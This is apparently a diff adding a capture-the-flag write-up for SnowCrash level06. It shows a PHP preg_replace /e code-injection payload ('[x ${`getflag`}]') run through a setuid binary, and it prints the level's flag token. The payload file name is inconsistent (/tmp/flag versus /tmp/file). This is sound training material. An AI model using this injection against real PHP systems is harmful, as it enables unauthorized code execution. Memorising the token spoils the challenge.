@@ -1,0 +1,58 @@
+level06@SnowCrash:~$ ll
+total 24
+dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 ./
+d--x--x--x  1 root    users    340 Aug 30  2015 ../
+-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout*
+-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc*
+-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
+-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
+-r-x------  1 level06 level06  675 Apr  3  2012 .profile*
+
+#we have a binary and a .php file. We run the binary:
+level06@SnowCrash:~$ ./level06
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+#we run strings on the binary:
+
+...
+setresgid
+setresuid
+execve
+getegid
+geteuid
+__libc_start_main
+free
+GLIBC_2.0
+WVSQ
+PRRR
+Y[^_]
+PTRhp
+QVhP
+[^_]
+8-uV@1
+.u6@1
+UWVS
+[^_]
+/usr/bin/php
+/home/user/level06/level06.php
+...
+
+#So we see that somewhere in the program /home/user/level06/level06.php is used
+#We check the group of level06:
+level06@SnowCrash:~$ stat level06
+  File: level06
+  Size: 7503            Blocks: 16         IO Block: 4096   regular file
+Device: 10h/16d Inode: 11387       Links: 1
+Access: (4750/-rwsr-x---)  Uid: ( 3006/  flag06)   Gid: ( 2006/ level06)
+Access: 2015-08-30 17:51:53.000000000 +0200
+Modify: 2015-08-30 17:51:53.000000000 +0200
+Change: 2024-01-25 15:55:40.744902005 +0100
+ Birth: -
+
+#In the php script we see that the e option is used in the regex which allow us to interpret the expression as php code and execute it
+#The script takes a file and read it so we create a file with the php code we want to execute:
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/flag
+#We execute
+level06@SnowCrash:~$ ./level06 /tmp/file
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
